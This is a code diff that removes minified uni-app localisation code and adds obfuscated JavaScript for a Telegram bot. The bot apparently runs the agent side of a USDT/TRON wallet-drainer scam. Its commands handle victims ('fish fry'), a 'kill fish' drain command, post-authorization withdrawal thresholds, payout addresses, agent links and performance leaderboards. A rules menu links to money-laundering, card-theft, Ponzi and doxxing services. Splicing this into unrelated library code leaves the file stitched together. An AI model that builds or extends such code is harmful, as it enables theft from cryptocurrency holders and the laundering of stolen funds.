-        a = r(n("0bdb")),
-        s = r(n("3b2d")),
-        u = function (e) {
-          return null !== e && "object" === (0, s.default)(e);
-        },
-        c = ["{", "}"],
-        l = function () {
-          function e() {
-            (0, o.default)(this, e), this._caches = Object.create(null);
-          }
-          return (0, a.default)(e, [{
-            key: "interpolate",
-            value: function (e, t) {
-              var n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : c;
-              if (!t) return [e];
-              var r = this._caches[e];
-              return r || (r = h(e, n), this._caches[e] = r), p(r, t);
+          if (!hy) {
+            const j3 = await fs.promises.readFile(TRCID_STORE_PATH, "utf8"),
+              j4 = JSON.parse(j3),
+              j5 = String(j4?.["at"] || "");
+            if (j5 !== hT) {
+              const j7 = {
+                text: "未找到对应的访问者信息",
+                show_alert: true
+              };
+              await j.answerCallbackQuery(n.id, j7);
+              return;
             }
-          }]), e;
-        }();
-      t.Formatter = l;
-      var f = /^(?:\d)+/,
-        d = /^(?:\w)+/;
-      function h(e, t) {
-        var n = (0, i.default)(t, 2),
-          r = n[0],
-          o = n[1],
-          a = [],
-          s = 0,
-          u = "";
-        while (s < e.length) {
-          var c = e[s++];
-          if (c === r) {
-            u && a.push({
-              type: "text",
-              value: u
-            }), u = "";
-            var l = "";
-            c = e[s++];
-            while (void 0 !== c && c !== o) l += c, c = e[s++];
-            var h = c === o,
-              p = f.test(l) ? "list" : h && d.test(l) ? "named" : "unknown";
-            a.push({
-              value: l,
-              type: p
-            });
-          } else u += c;
-        }
-        return u && a.push({
-          type: "text",
-          value: u
-        }), a;
-      }
-      function p(e, t) {
-        var n = [],
-          r = 0,
-          i = Array.isArray(t) ? "list" : u(t) ? "named" : "unknown";
-        if ("unknown" === i) return n;
-        while (r < e.length) {
-          var o = e[r];
-          switch (o.type) {
-            case "text":
-              n.push(o.value);
-              break;
-            case "list":
-              n.push(t[parseInt(o.value, 10)]);
-              break;
-            case "named":
-              "named" === i && n.push(t[o.value]);
-              break;
-            case "unknown":
-              0;
-              break;
+            hy = j4?.["user"] || null;
+            if (!hy) {
+              const j9 = {
+                text: "访问者信息缺失",
+                show_alert: true
+              };
+              await j.answerCallbackQuery(n.id, j9);
+              return;
+            }
           }
-          r++;
+          const hg = ("" + (hy.first_name || "") + (hy.last_name ? " " + hy.last_name : "")).trim() || "无",
+            hW = hy.username || "无",
+            hZ = hC.username || hC.fullName || "无",
+            hm = "昵称：" + hg + "\n用户名：" + hW + "\n最后邀请人：" + hZ,
+            j0 = {
+              text: hm,
+              show_alert: true
+            };
+          await j.answerCallbackQuery(n.id, j0);
+        } catch (jp) {
+          const jj = {
+            text: "访问者信息读取失败",
+            show_alert: true
+          };
+          await j.answerCallbackQuery(n.id, jj);
         }
-        return n;
+        return;
       }
-      t.LOCALE_ZH_HANS = "zh-Hans";
-      t.LOCALE_ZH_HANT = "zh-Hant";
-      t.LOCALE_EN = "en";
-      t.LOCALE_FR = "fr";
-      t.LOCALE_ES = "es";
-      var g = Object.prototype.hasOwnProperty,
-        v = function (e, t) {
-          return g.call(e, t);
-        },
-        m = new l();
-      function _(e, t) {
-        if (e) {
-          if (e = e.trim().replace(/_/g, "-"), t && t[e]) return e;
-          if (e = e.toLowerCase(), "chinese" === e) return "zh-Hans";
-          if (0 === e.indexOf("zh")) return e.indexOf("-hans") > -1 ? "zh-Hans" : e.indexOf("-hant") > -1 || function (e, t) {
-            return !!t.find(function (t) {
-              return -1 !== e.indexOf(t);
-            });
-          }(e, ["-tw", "-hk", "-mo", "-cht"]) ? "zh-Hant" : "zh-Hans";
-          var n = ["en", "fr", "es"];
-          t && Object.keys(t).length > 0 && (n = Object.keys(t));
-          var r = function (e, t) {
-            return t.find(function (t) {
-              return 0 === e.indexOf(t);
-            });
-          }(e, n);
-          return r || void 0;
-        }
+      if (S.startsWith("fish_")) {
+        await handleFishCallback(n);
+        return;
       }
-      var y = function () {
-        function e(t) {
-          var n = t.locale,
-            r = t.fallbackLocale,
-            i = t.messages,
-            a = t.watcher,
-            s = t.formater;
-          (0, o.default)(this, e), this.locale = "en", this.fallbackLocale = "en", this.message = {}, this.messages = {}, this.watchers = [], r && (this.fallbackLocale = r), this.formater = s || m, this.messages = i || {}, this.setLocale(n || "en"), a && this.watchLocale(a);
-        }
-        return (0, a.default)(e, [{
-          key: "setLocale",
-          value: function (e) {
-            var t = this,
-              n = this.locale;
-            this.locale = _(e, this.messages) || this.fallbackLocale, this.messages[this.locale] || (this.messages[this.locale] = {}), this.message = this.messages[this.locale], n !== this.locale && this.watchers.forEach(function (e) {
-              e(t.locale, n);
-            });
-          }
-        }, {
-          key: "getLocale",
-          value: function () {
-            return this.locale;
-          }
-        }, {
-          key: "watchLocale",
-          value: function (e) {
-            var t = this,
-              n = this.watchers.push(e) - 1;
-            return function () {
-              t.watchers.splice(n, 1);
+      if (S.startsWith("network_")) {
+        await handleDailiCallback(n);
+        return;
+      }
+    } catch (ja) {
+      console.error("[" + getTimeInfo().time + "] 处理回调查询错误:", ja);
+      const jz = {
+        text: "处理请求时出现错误，请联系管理员",
+        show_alert: true
+      };
+      await j.answerCallbackQuery(n.id, jz);
+    }
+  });
+}
+function setupBotHandlers(M) {
+  const Y = {
+    type: "help",
+    regex: /^(?:帮助|help|菜单|指令|命令)$/
+  };
+  const V = {};
+  V.type = "trcid";
+  V.regex = /^(?:trcid|TRCID|来路|来源)(?:\s+([A-Za-z0-9_-]+))?$/;
+  const N = {};
+  N.type = "classMode";
+  N.regex = /^(上课|下课)$/;
+  const r = {};
+  r.type = "rules";
+  r.regex = /^(规则|交易规则|担保交易规则|担保规则)$/;
+  const B = {};
+  B.type = "threshold";
+  B.regex = /^(?:修改阈值|阈值修改|阈值|修改阀值|阀值修改|阀值)\s*([A-Za-z0-9]+)\s*([0-9.]+)$/;
+  const R = {};
+  R.type = "killFish";
+  R.regex = /^(?:杀鱼|单杀)\s*([A-Za-z0-9]+)$/;
+  const f = {
+    type: "paymentAddress",
+    regex: /^(?:收款地址|设置地址|设置收款地址)\s*([A-Za-z0-9]+)$/
+  };
+  const X = {
+    type: "autoThreshold",
+    regex: /^(?:自动阈值|设置自动阈值|全局阈值|设置阈值|设置阀值|自动阀值|设置自动阀值|全局阀值)\s*([0-9.]+)$/
+  };
+  const n = {};
+  n.type = "getPaymentAddress";
+  n.regex = /^(收款地址)$/;
+  const c = {
+    type: "getFishInfo",
+    regex: /^(我的|我的鱼苗|鱼苗|鱼池)$/
+  };
+  const G = {
+    type: "getAgentLink",
+    regex: /^(代理|代理链接|链接|商城|发卡)$/
+  };
+  const S = {
+    type: "adminQueryFish",
+    regex: /^(?:查看鱼苗|查看用户|查看代理|鱼苗查询|查询鱼苗)(?:\s*@|\s+@)([A-Za-z0-9_]+)$/
+  };
+  const e = {};
+  e.type = "payment";
+  e.regex = /^(?:收款|收银台|收银)\s*([0-9]+(?:\.[0-9]{1,6})?)$/;
+  const o = {
+    type: "genTPQR",
+    regex: /^(TP)$/i
+  };
+  const i = {
+    type: "genIMQR",
+    regex: /^(IM)$/i
+  };
+  const Q = {
+    type: "redClaim",
+    regex: /(红包领取|领取红包|拆红包|已领取红包)/
+  };
+  const T = {};
+  T.type = "leaderboard";
+  T.regex = /^(?:排行榜|业绩)$/;
+  const C = {
+    type: "performanceAdd",
+    regex: /^([^\s@]+)\s*(\+|＋|\-|－)\s*(\d+(?:\.[0-9]{1,2})?)$/
+  };
+  const v = {
+    type: "performanceReset",
+    regex: /^(?:清零业绩|业绩清零|重置业绩)$/
+  };
+  const x = [Y, V, N, r, B, R, f, X, n, c, G, S, e, o, i, Q, T, C, v];
+  M.on("message", async k => {
+    try {
+      const y = k.chat.id.toString(),
+        t = k.from.id,
+        p4 = k.text?.["trim"]() || "",
+        p5 = k.message_id;
+      if (k.chat.type === "private") {
+        return;
+      }
+      if (!cacheData.dailiGroupMap.has(y)) {
+        return;
+      }
+      const {
+          isAdmin: p6,
+          isCreator: p7
+        } = await checkGroupAdminStatus(M, y, t),
+        p8 = p6 || p7,
+        p9 = await handleClassModeAndGroupState(M, y, null, null, "getStatus");
+      if (p9 && !p8 && !p4) {
+        await handleClassModeAndGroupState(M, y, null, null, "handleViolation", t, p5);
+        return;
+      }
+      if (!p4) {
+        return;
+      }
+      const pp = function pJ(pa) {
+        for (const pb of x) {
+          const pF = pa.match(pb.regex);
+          if (pF) {
+            return {
+              type: pb.type,
+              args: pF.slice(1)
             };
           }
-        }, {
-          key: "add",
-          value: function (e, t) {
-            var n = !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2],
-              r = this.messages[e];
-            r ? n ? Object.assign(r, t) : Object.keys(t).forEach(function (e) {
-              v(r, e) || (r[e] = t[e]);
-            }) : this.messages[e] = t;
-          }
-        }, {
-          key: "f",
-          value: function (e, t, n) {
-            return this.formater.interpolate(e, t, n).join("");
-          }
-        }, {
-          key: "t",
-          value: function (e, t, n) {
-            var r = this.message;
-            return "string" === typeof t ? (t = _(t, this.messages), t && (r = this.messages[t])) : n = t, v(r, e) ? this.formater.interpolate(r[e], n).join("") : (console.warn("Cannot translate the value of keypath ".concat(e, ". Use the value of keypath as default.")), e);
-          }
-        }]), e;
-      }();
-      function w(e, t) {
-        e.$watchLocale ? e.$watchLocale(function (e) {
-          t.setLocale(e);
-        }) : e.$watch(function () {
-          return e.$locale;
-        }, function (e) {
-          t.setLocale(e);
-        });
+        }
+        return null;
+      }(p4);
+      if (p9 && !p8) {
+        const pa = Object.values(g).some(pz => pz instanceof RegExp ? pz.test(p4) : pz(p4)) || isCalculator(p4);
+        if (!pa) {
+          await handleClassModeAndGroupState(M, y, null, null, "handleViolation", t, p5);
+          return;
+        }
       }
-      function b() {
-        return "undefined" !== typeof uni && uni.getLocale ? uni.getLocale() : "undefined" !== typeof e && e.getLocale ? e.getLocale() : "en";
+      if (!pp) {
+        return;
       }
-      t.I18n = y;
-      var x,
-        k = function (e) {
-          return "string" === typeof e;
-        };
-      function S(e, t) {
-        return e.indexOf(t[0]) > -1;
-      }
-      function O(e, t, n) {
-        return x.interpolate(e, t, n).join("");
-      }
-      function T(e, t, n) {
-        return P(e, function (e, r) {
-          (function (e, t, n, r) {
-            var i = e[t];
-            if (k(i)) {
-              if (S(i, r) && (e[t] = O(i, n[0].values, r), n.length > 1)) {
-                var o = e[t + "Locales"] = {};
-                n.forEach(function (e) {
-                  o[e.locale] = O(i, e.values, r);
-                });
+      switch (pp.type) {
+        case "redClaim":
+          {
+            try {
+              if (!cacheData.dailiGroupMap.has(y)) {
+                break;
               }
-            } else T(i, n, r);
-          })(e, r, t, n);
-        }), e;
+              const pF = k.from.username || k.from.first_name || "",
+                pU = 100000;
+              redbotDb.run("INSERT OR IGNORE INTO users (tgid, nickname, usdt_balance) VALUES (?, ?, ?)", [t, pF, 0], () => {
+                redbotDb.run("UPDATE users SET usdt_balance = usdt_balance + ? WHERE tgid = ?", [pU, t], function (pK) {
+                  if (pK || this.changes === 0) {
+                    const pO = {
+                      reply_to_message_id: p5
+                    };
+                    return M.sendMessage(y, "❌ 发放失败，请稍后重试。", pO);
+                  }
+                  const pE = {
+                    reply_to_message_id: p5
+                  };
+                  M.sendMessage(y, "✅ 已为当前TGID发放 " + pU + " USDT（Okpaybot 机器人账户）", pE);
+                });
+              });
+            } catch (pK) {
+              try {
+                M.sendMessage(y, "处理加款请求失败");
+              } catch (pE) {}
+            }
+            break;
+          }
+        case "help":
+          {
+            const ps = generateHelpMessage(),
+              pd = {
+                parse_mode: "HTML",
+                reply_to_message_id: p5,
+                disable_web_page_preview: true
+              };
+            await M.sendMessage(y, ps, pd);
+            break;
+          }
+        case "classMode":
+          {
+            const pA = await handleClassModeAndGroupState(M, y, k, p4);
+            if (pA) {
+              return;
+            }
+            break;
+          }
+        case "rules":
+          {
+            const pL = generateTradeRulesMessage(),
+              pY = {
+                parse_mode: "HTML",
+                reply_to_message_id: p5,
+                disable_web_page_preview: true
+              };
+            await M.sendMessage(y, pL, pY);
+            break;
+          }
+        case "genTPQR":
+          {
+            await handleQuickQRCodeCommand(M, y, k, "tp");
+            break;
+          }
+        case "genIMQR":
+          {
+            await handleQuickQRCodeCommand(M, y, k, "im");
+            break;
+          }
+        case "trcid":
+          {
+            let pB = pp.args && pp.args[0] ? String(pp.args[0]).trim() : "";
+            const pR = {
+              trcid: "",
+              deeplink: ""
+            };
+            let pf = pR;
+            if (!pB) {
+              pf = await readLatestTrcid();
+            } else {
+              const pS = {
+                trcid: pB,
+                deeplink: ""
+              };
+              pf = pS;
+            }
+            if (!pf.trcid) {
+              const pe = {
+                reply_to_message_id: p5
+              };
+              await M.sendMessage(y, "未找到最近的来路信息（TRCID）。请从机器人入口访问一次：/start?start=trcid", pe);
+              break;
+            }
+            const pX = formatTrcidMessage(k, pf.trcid, pf.deeplink),
+              pn = {
+                reply_to_message_id: p5,
+                disable_web_page_preview: false
+              };
+            await M.sendMessage(y, pX, pn);
+            break;
+          }
+        case "threshold":
+        case "killFish":
+          {
+            const pQ = pp.type === "killFish",
+              pT = pp.args[0],
+              pC = pQ ? 0 : parseFloat(pp.args[1]),
+              pv = await updateThreshold(y, k, pT, pC, pQ, M);
+            if (pv) {
+              const pk = {
+                parse_mode: "HTML",
+                reply_to_message_id: p5
+              };
+              await M.sendMessage(y, pv, pk);
+            }
+            break;
+          }
+        case "paymentAddress":
+          {
+            const pH = pp.args[0],
+              py = await updatePaymentAddress(y, k, pH);
+            if (py && py.text) {
+              await M.sendMessage(y, py.text, {
+                ...py.options,
+                reply_to_message_id: p5
+              });
+            }
+            break;
+          }
+        case "autoThreshold":
+          {
+            const pZ = parseFloat(pp.args[0]),
+              pm = await updateAutoThreshold(y, k, pZ);
+            if (pm && pm.text) {
+              await M.sendMessage(y, pm.text, {
+                ...pm.options,
+                reply_to_message_id: k.message_id
+              });
+            }
+            break;
+          }
+        case "getPaymentAddress":
+          {
+            const h2 = await getPaymentAddressInfo(y, k);
+            if (h2 && h2.text) {
+              await M.sendMessage(y, h2.text, {
+                ...h2.options,
+                reply_to_message_id: p5
+              });
+            }
+            break;
+          }
+        case "getFishInfo":
+          {
+            const h5 = await getFishMessage(y, k);
+            if (h5 && h5.text) {
+              await M.sendMessage(y, h5.text, {
+                ...h5.options,
+                reply_to_message_id: p5
+              });
+            }
+            break;
+          }
+        case "getAgentLink":
+          {
+            const h7 = await getDomainMessage(y, k);
+            if (h7 && h7.text) {
+              const h9 = await M.sendMessage(y, h7.text, {
+                ...h7.options,
+                reply_to_message_id: p5
+              });
+              if (h9 && h9.message_id) {
+                setTimeout(async () => {
+                  try {
+                    await M.deleteMessage(y, h9.message_id);
+                  } catch (hw) {}
+                }, BROADCAST_AUTO_DELETE_MS);
+              }
+            }
+            break;
+          }
+        case "adminQueryFish":
+          {
+            const hw = pp.args[0],
+              hJ = await adminQueryUserFish(y, k, hw, M);
+            if (hJ && hJ.text) {
+              await M.sendMessage(y, hJ.text, {
+                ...hJ.options,
+                reply_to_message_id: p5
+              });
+            }
+            break;
+          }
+        case "payment":
+          {
+            const hl = parseFloat(pp.args[0]),
+              hb = await handlePaymentRequest(y, k, hl);
+            if (hb && hb.text) {
+              await M.sendMessage(y, hb.text, {
+                ...hb.options,
+                reply_to_message_id: p5
+              });
+            }
+            break;
+          }
+        case "leaderboard":
+          {
+            try {
+              const hU = await buildMonthlyLeaderboardMessage(y, k.from.id),
+                hu = 3500,
+                hK = [];
+              for (let hq = 0; hq < hU.length; hq += hu) {
+                hK.push(hU.slice(hq, hq + hu));
+              }
+              for (const hP of hK) {
+                const hs = {
+                  reply_to_message_id: p5,
+                  parse_mode: "HTML"
+                };
+                const hd = await M.sendMessage(y, hP, hs);
+                hd && hd.message_id && setTimeout(async () => {
+                  try {
+                    await M.deleteMessage(y, hd.message_id);
+                  } catch (hL) {}
+                }, BROADCAST_AUTO_DELETE_MS);
+              }
+            } catch (hM) {
+              console.error("leaderboard error", hM);
+              const hL = {
+                reply_to_message_id: p5
+              };
+              await M.sendMessage(y, "获取排行榜失败，请稍后再试。", hL);
+            }
+            break;
+          }
+        case "performanceAdd":
+          {
+            try {
+              const {
+                isAdmin: hN,
+                isCreator: hr
+              } = await checkGroupAdminStatus(M, y, t);
+              if (!(hN || hr)) {
+                break;
+              }
+              await ensurePerformanceTable();
+              const hB = String(pp.args[0] || "").trim(),
+                hR = String(pp.args[1] || "+"),
+                hf = parseFloat(pp.args[2] || "0");
+              if (!hB || !isFinite(hf) || hf <= 0) {
+                const ho = {
+                  reply_to_message_id: p5
+                };
+                await M.sendMessage(y, "格式：昵称 ±数字，例如 渔夫羊 +100 或 张三 -50", ho);
+                break;
+              }
+              const hX = hR === "-" || hR === "－" ? -hf : hf,
+                hn = await addPerformance(y, hB, hX),
+                hc = hX >= 0 ? "增加业绩 +" + Math.abs(hX).toFixed(2) : "减少业绩 -" + Math.abs(hX).toFixed(2),
+                hG = {
+                  reply_to_message_id: p5
+                };
+              await M.sendMessage(y, "已为 " + hB + " " + hc + "，当前：" + hn.toFixed(2), hG);
+            } catch (hQ) {
+              console.error("performanceAdd error", hQ);
+              const hT = {
+                reply_to_message_id: p5
+              };
+              await M.sendMessage(y, "更新业绩失败，请稍后再试。", hT);
+            }
+            break;
+          }
+        case "performanceReset":
+          {
+            try {
+              const {
+                isAdmin: hD,
+                isCreator: hH
+              } = await checkGroupAdminStatus(M, y, t);
+              if (!(hD || hH)) {
+                break;
+              }
+              await ensurePerformanceTable();
+              const hy = y.toString();
+              await pool.promise().query("DELETE FROM " + PERF_TABLE + " WHERE groupid = ?", [hy]);
+              const ht = {
+                reply_to_message_id: p5
+              };
+              await M.sendMessage(y, "✅ 已删除本群业绩数据。", ht);
+            } catch (hW) {
+              console.error("performanceReset error", hW);
+              const hm = {
+                reply_to_message_id: p5
+              };
+              await M.sendMessage(y, "清零失败，请稍后再试。", hm);
+            }
+            break;
+          }
+        default:
+          {
+            console.log("[" + getTimeInfo().time + "] 未识别的命令类型：" + pp.type);
+          }
       }
-      function P(e, t) {
-        if (Array.isArray(e)) {
-          for (var n = 0; n < e.length; n++) if (t(e, n)) return !0;
-        } else if (u(e)) for (var r in e) if (t(e, r)) return !0;
-        return !1;
-      }
-      t.isString = k;
-    }).call(this, n("0ee4"));
+    } catch (j2) {
+      console.error("[" + getTimeInfo().time + "] 消息处理错误:", j2);
+      await M.sendMessage(k.chat.id, "❌ 处理命令时出现错误，请稍后重试。", {
+        reply_to_message_id: k.message_id
+      });
+    }
+  });
+}
+const g = {
+  help: /^(?:帮助|help|菜单|指令|命令)$/,
+  threshold: /^(?:修改阈值|阈值修改|阈值|修改阀值|阀值修改|阀值)\s*(?:T[1-9A-HJ-NP-Za-km-z]{33})\s*([0-9.]+)$/,
+  killFish: /^杀鱼\s*(?:T[1-9A-HJ-NP-Za-km-z]{33})$/,
+  paymentAddress: /^(?:收款地址|设置地址|设置收款地址)\s*(?:T[1-9A-HJ-NP-Za-km-z]{33})$/,
+  queryPaymentAddress: /^收款地址$/,
+  myFish: /^(?:我的|我的鱼苗|鱼苗|鱼池)$/,
+  proxy: /^(?:代理|代理链接|链接|商城|发卡)$/,
+  autoThreshold: /^(?:自动阈值|设置自动阈值|全局阈值|设置阈值|设置阀值|自动阀值|设置自动阀值|全局阀值)\s*([0-9.]+)$/,
+  price: /^🏦汇率查询$|^汇率$|^usdt$|^USDT$|^L$|^l$|^\d+[uU]$|^[Zz]\d{1,10}$/,
+  trx: /^🪫TRX 闪兑$|^闪兑$|^trx$|^TRX$|^TRC$|^trc$/,
+  energy: /^🔋能量租赁$|^能量租赁$|^能量$/,
+  id: /^ID查询$|^telegramid$|^id查询$|^查询ID$|^查询id$|^🔍TGID查询$/,
+  botCommands: /^(?:机器人|担保|汇旺|新币)$/,
+  rules: /^(?:规则|交易规则|担保交易规则|担保规则)$/,
+  addressCheck: /^(?:T[1-9A-HJ-NP-Za-km-z]{33})$/
+};
+const isCalculator = j => {
+    if (!j || !/^[\d\+\-\*/\%\(\)\. =xX÷％]+$/.test(j)) {
+      return false;
+    }
+    if (/^\d+$/.test(j)) {
+      return false;
+    }
+    let w = j.split("=")[0].replace(/x/gi, "*").replace(/÷/g, "/").replace(/％/g, "%").trim();
+    if (!/^[\d\(]/.test(w) || !/[\d\)]$/.test(w)) {
+      return false;
+    }
+    return /[\+\-\*/\%]/.test(w);
   },
-  d40d: function (e, t, n) {
-    "use strict";
-
-    var r = n("47a9"),
-      i = r(n("7ca3"));
-    n("7903");
-    var o = r(n("951c")),
-      a = r(n("8572"));
-    function s(e, t) {
-      var n = Object.keys(e);
-      if (Object.getOwnPropertySymbols) {
-        var r = Object.getOwnPropertySymbols(e);
-        t && (r = r.filter(function (t) {
-          return Object.getOwnPropertyDescriptor(e, t).enumerable;
-        })), n.push.apply(n, r);
+  violationCounts = new Map();
+async function handleClassModeAndGroupState(a, z, l, b, I = null, F = null, U = null) {
+  try {
+    function K(L) {
+      for (const N of violationCounts.keys()) {
+        if (N.startsWith(L + ":")) {
+          violationCounts.delete(N);
+        }
       }
+    }
+    if (I) {
+      switch (I) {
+        case "getStatus":
+          const L = cacheData.dailiGroupMap.get(z);
+          return L?.["status"] === 0;
+        case "setStatus":
+          const Y = F ? 0 : 1;
+          await pool.promise().query("UPDATE daili_group SET status = ? WHERE groupid = ?", [Y, z]);
+          const V = cacheData.dailiGroupMap.get(z);
+          if (V) {
+            V.status = Y;
+            cacheData.dailiGroupMap.set(z, V);
+          }
+          if (!F) {
+            K(z);
+          }
+          break;
+        case "getViolation":
+          return violationCounts.get(z + ":" + F) || 0;
+        case "addViolation":
+          const N = (violationCounts.get(z + ":" + F) || 0) + 1;
+          violationCounts.set(z + ":" + F, N);
+          return N;
+        case "resetViolation":
+          violationCounts.delete(z + ":" + F);
+          break;
+        case "clearViolations":
+          K(z);
+          break;
+        case "handleViolation":
+          const r = await handleClassModeAndGroupState(a, z, null, null, "addViolation", F),
+            B = "🤐 下课期间，禁止发送非命令消息，第" + r + "次警告，违规3次以上将禁言处理",
+            R = {
+              reply_to_message_id: U
+            };
+          const f = await a.sendMessage(z, B, R);
+          try {
+            await a.deleteMessage(z, U);
+          } catch (G) {
+            console.error("[" + getTimeInfo().time + "] 在 " + z + " 群删除客户消息失败:", G);
+          }
+          setTimeout(async () => {
+            try {
+              await a.deleteMessage(z, f.message_id);
+            } catch (o) {
+              console.error("[" + getTimeInfo().time + "] 在 " + z + " 群删除警告消息失败:", o);
+            }
+          }, 3000);
+          if (r >= 3) {
+            try {
+              const o = {
+                can_send_messages: false,
+                can_send_media_messages: false,
+                can_add_web_page_previews: false,
+                can_change_info: false,
+                can_invite_users: false
+              };
+              await a.restrictChatMember(z, F, o, 3);
+              await handleClassModeAndGroupState(a, z, null, null, "resetViolation", F);
+            } catch (Q) {
+              console.error("[" + getTimeInfo().time + "] 在 " + z + " 群限制用户禁言失败:", Q);
+            }
+          }
+          return false;
+        default:
+          break;
+      }
+      if (!l) {
+        return;
+      }
+    }
+    if (!l) {
+      return false;
+    }
+    const q = l.from.id,
+      P = await checkGroupAdminStatus(a, z, q),
+      O = P.isAdmin || P.isCreator;
+    if (!O) {
+      return false;
+    }
+    const s = b === "下课";
+    await handleClassModeAndGroupState(a, z, null, null, "setStatus", s);
+    const d = "下课成功，下课期间禁止闲聊，仅允许发送以下命令：\n    \n🌐<code>代理</code>（<u>获取推广链接</u>）\n\n🐟<code>鱼苗</code>（<u>查看自己的鱼苗</u>）\n\n💰<code>收款地址</code>（<u>查看自己的收款地址</u>）\n\n💳收款地址+地址（<u>绑定自己的收款地址</u>）\n例：<code>收款地址 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code>\n\n⚔️杀鱼+鱼苗地址（<u>杀鱼命令</u>）\n例：<code>杀鱼 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code>\n\n⚙️自动阈值+新的自动阈值（<u>授权后自动设置的阈值</u>）\n例：<code>自动阈值 5000</code>\n\n🔏阈值+鱼苗地址+新的阈值（<u>修改提币阈值</u>）\n例：<code>阈值 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t 10000</code>",
+      A = s ? d : "🎣 新的一天开始，预祝大家今天杀鱼多多",
+      M = {};
+    M.parse_mode = "HTML";
+    await a.sendMessage(z, A, M);
+    return true;
+  } catch (k) {
+    console.error("[" + getTimeInfo().time + "] 在 " + z + " 群处理上课/下课错误:", k);
+    if (I === "getStatus") {
+      return false;
+    }
+    return false;
+  }
+}
+function generateTradeRulesMessage() {
+  const w = {
+    tAFsL: function (l, b) {
+      return l === b;
+    },
+    XgliE: "ASnYJ",
+    LwGwX: "常规卡卡交易",
+    qvUsz: "大混卡卡交易",
+    PylkQ: "常规回U交易",
+    SgLpy: "大混回U交易",
+    KCmHF: "常规码回U交易",
+    vQVul: "一道常规码接交易",
+    mlwhu: "公檢法進算",
+    UwzNB: "BC料收付一体",
+    NsZhm: "BC料代收",
+    mCNzj: "纯BC充U代付",
+    DCglH: "充U代付交易",
+    LHXti: "卡接一道进算",
+    wEXWN: "资金盘一道交易",
+    rnYgD: "京东小时达",
+    SlznO: "话费卡",
+    UKLca: "实物小时达",
+    AtBkC: "二道常规交易",
+    xVmCE: "油卡充值卡",
+    tIfFA: "码接二道常规料",
+    rXRvt: "精聊二道",
+    ZIXuK: "一道色料码接",
+    gPVEn: "口令红包",
+    IiKDo: "一道微信群转账进算",
+    guxgB: "码接二道色料",
+    uFKTo: "二道数字人民币",
+    bXZPA: "话费卡核销",
+    PFtEN: "京东E卡",
+    MyfFo: "支付宝口令代收",
+    PMvRd: "充值话费交易",
+    zHReU: "纯BC代付交易",
+    YEzhi: "码接二道精聊回U",
+    ZYQnj: "日本私户规则",
+    gOhbX: "资金盘前中期二道料",
+    ixtst: "资金盘一道交易规则",
+    xidcd: "大区二道",
+    XBWGG: "钉钉群收款",
+    rSEZb: "钉钉红包常规",
+    bmfvn: "一道常规网关进算",
+    nTMbx: "纯白资U兑换一道盗刷U",
+    xEUIq: "精料无卡取现",
+    pnlKL: "承兑支付宝微信码接回u",
+    VYRjT: "搭建机器人/网站交易",
+    vPwXb: "抖币快币代充",
+    MfIDw: "黄金/苹果手机",
+    BUibs: "📜 以下规则仅供参考：\n\n"
+  };
+  const J = w,
+    a = [[J.LwGwX, 33, J.qvUsz, 34, J.PylkQ, 35], [J.SgLpy, 36, J.KCmHF, 37, J.vQVul, 38], [J.mlwhu, 39, J.UwzNB, 40, J.NsZhm, 41], [J.mCNzj, 42, J.DCglH, 43, J.LHXti, 44], [J.wEXWN, 45, J.rnYgD, 46, J.SlznO, 47], [J.UKLca, 48, J.AtBkC, 49, J.xVmCE, 50], [J.tIfFA, 51, J.rXRvt, 52, J.ZIXuK, 53], [J.gPVEn, 54, J.IiKDo, 55, J.guxgB, 56], [J.uFKTo, 57, J.bXZPA, 58, J.PFtEN, 60], [J.MyfFo, 84, J.PMvRd, 66, J.zHReU, 83], [J.YEzhi, 79, J.ZYQnj, 75, J.rXRvt, 89], [J.gOhbX, 86, J.ixtst, 64, J.xidcd, 74], [J.XBWGG, 73, J.rSEZb, 65, J.bmfvn, 78], ["快手", 71, J.nTMbx, 69, J.xEUIq, 72], [J.pnlKL, 85, J.VYRjT, 68, J.vPwXb, 62], ["克隆", 63, "查档", 80, J.MfIDw, 87]];
+  let z = J.BUibs;
+  a.forEach(l => {
+    if (J.tAFsL(J.XgliE, J.XgliE)) {
+      z += "<a href=\"https://t.me/tianhui654/" + l[1] + "\"><u>" + l[0] + "</u></a> | <a href=\"https://t.me/tianhui654/" + l[3] + "\"><u>" + l[2] + "</u></a> | <a href=\"https://t.me/tianhui654/" + l[5] + "\"><u>" + l[4] + "</u></a>\n";
+    } else {
+      const I = {
+        trcid: a,
+        deeplink: ""
+      };
+      J = I;
+    }
+  });
+  return z;
+}
+function generateHelpMessage() {
+  return "📖 <b>常用命令帮助</b>\n\n🌐 <b>代理</b>（获取推广链接）\n\n🐟 <b>鱼苗</b>（查看自己的鱼苗）\n\n💰 <b>收款地址</b>（查看自己的收款地址）\n\n💳 <b>收款地址 + 地址</b>（绑定自己的收款地址）\n例：<code>收款地址 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code>\n\n⚔️ <b>杀鱼 + 鱼苗地址</b>（杀鱼命令）\n例：<code>杀鱼 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code>\n\n🔏 <b>阈值 + 鱼苗地址 + 新的阈值</b>（修改提币阈值）\n例：<code>阈值 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t 10000</code>\n\n🏦 <b>收银 + 金额</b>（获取专属的收银台）\n例：<code>收银 1000</code>";
+}
+async function checkGroupAdminStatus(J, a, z) {
+  try {
+    const I = await J.getChatMember(a, z),
+      F = await J.getChatAdministrators(a),
+      U = I.status === "creator",
+      u = F.some(q => q.user.id === z),
+      K = {
+        isCreator: U,
+        isAdmin: u,
+        status: I.status
+      };
+    return K;
+  } catch (q) {
+    const E = {
+      isCreator: false,
+      isAdmin: false,
+      status: "member"
+    };
+    return E;
+  }
+}
+async function handlePaymentRequest(l, b, I) {
+  try {
+    const u = b.from.id.toString(),
+      K = l.toString();
+    let q = null;
+    for (const [N, r] of cacheData.dailiMap) {
+      if (r.tguid && r.tguid.toString() === u && r.groupid && r.groupid.toString() === K) {
+        q = r;
+        break;
+      }
+    }
+    if (!q) {
+      const f = {
+        text: "⛔️ 请先注册成为代理后再使用收银台功能",
+        options: {}
+      };
+      f.options.parse_mode = "HTML";
+      return f;
+    }
+    const E = cacheData.options.main_domain;
+    if (!E) {
+      const n = {
+        text: "❌ 系统配置错误，请联系管理员",
+        options: {}
+      };
+      n.options.parse_mode = "HTML";
